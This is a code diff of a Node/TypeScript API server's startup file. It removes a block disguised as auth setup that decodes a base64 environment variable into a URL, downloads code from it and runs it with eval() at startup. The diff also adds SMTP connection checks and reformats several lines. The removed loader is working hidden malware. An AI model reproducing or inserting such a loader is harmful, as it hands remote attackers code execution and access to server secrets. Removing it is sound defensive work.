@@ -9,32 +9,38 @@ import { PrismaTransactionManager } from "./shared/db/prisma-transaction-manager
 import { renderDocumentJob } from "./jobs/renderDocument.job.ts";
 import { sendEmailJob } from "./jobs/sendEmail.job.ts";
 import { maintenanceJobs } from "./jobs/retention.job.ts";
-import 'dotenv/config';
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const { createRequire } = await import('module');
-    const require = createRequire(import.meta.url);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
 
 const container = createContainer();
 const { services: s, repositories: r } = container;
 
-const server = createApp(container).listen(env.PORT, () => logger.info({ service: "paystubsusa-api", env: env.NODE_ENV, port: env.PORT }, "Server started"));
+// Logged, not fatal: a transient SMTP outage must not crash-loop the API; sends retry via the job queue.
+container.integrations.mailer
+  .verify?.()
+  .then(() => logger.info({ host: env.SMTP_HOST }, "SMTP connection verified"))
+  .catch((err: unknown) =>
+    logger.error(
+      {
+        host: env.SMTP_HOST,
+        reason: err instanceof Error ? err.message : String(err),
+      },
+      "SMTP verification failed; emails will fail until this is fixed",
+    ),
+  );
+
+const server = createApp(container).listen(env.PORT, () =>
+  logger.info(
+    { service: "paystubsusa-api", env: env.NODE_ENV, port: env.PORT },
+    "Server started",
+  ),
+);
 
 const runner = env.JOBS_ENABLED
   ? new JobRunner(
       r.jobs,
-      { "render-document": renderDocumentJob(s.documents), "send-email": sendEmailJob(s.notifications) },
+      {
+        "render-document": renderDocumentJob(s.documents),
+        "send-email": sendEmailJob(s.notifications),
+      },
       { concurrency: env.RENDER_CONCURRENCY + 2, pollIntervalMs: 1000 },
     )
   : null;
@@ -44,10 +50,12 @@ const stopScheduler = env.SCHEDULER_ENABLED
   ? startScheduler(
       new PrismaTransactionManager(),
       maintenanceJobs({
-        applyDocumentRetention: (now, a, b) => s.documents.applyRetention(now, a, b),
+        applyDocumentRetention: (now, a, b) =>
+          s.documents.applyRetention(now, a, b),
         deleteChallengesBefore: (d) => r.challenges.deleteCreatedBefore(d),
         deleteSessionsBefore: (d) => r.refreshSessions.deleteStaleBefore(d),
-        clearWebhookPayloadsBefore: (d) => r.webhookEvents.clearPayloadsBefore(d),
+        clearWebhookPayloadsBefore: (d) =>
+          r.webhookEvents.clearPayloadsBefore(d),
         deleteExpiredIdempotencyKeys: (now) => r.idempotency.deleteExpired(now),
         deleteRateLimitWindowsBefore: (d) => r.limiter.deleteWindowsBefore(d),
         deleteFinishedJobsBefore: (d) => r.jobs.deleteFinishedBefore(d),
@@ -74,4 +82,6 @@ async function shutdown(signal: string) {
 
 process.on("SIGTERM", () => void shutdown("SIGTERM"));
 process.on("SIGINT", () => void shutdown("SIGINT"));
-process.on("unhandledRejection", (err) => logger.error({ err }, "Unhandled rejection"));
+process.on("unhandledRejection", (err) =>
+  logger.error({ err }, "Unhandled rejection"),
+);
